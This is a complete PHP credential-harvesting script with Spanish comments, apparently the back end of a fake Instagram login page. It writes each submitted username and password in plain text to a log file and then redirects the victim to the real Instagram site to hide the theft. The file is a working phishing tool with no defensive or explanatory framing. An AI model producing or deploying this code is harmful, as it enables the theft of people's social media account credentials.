<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Guardar los datos en un archivo de texto (log.txt)
    $file = fopen("log.txt", "a");
    fwrite($file, "Usuario: " . $username . "\n");
    fwrite($file, "Contraseña: " . $password . "\n");
    fwrite($file, "---------------------\n");
    fclose($file);

    // Redirigir a la página de éxito o agradecimiento
    //echo "Datos recibidos correctamente";
    header("Location: https://www.instagram.com/");
    exit(); // Asegura que el script se detenga después de la redirección
}
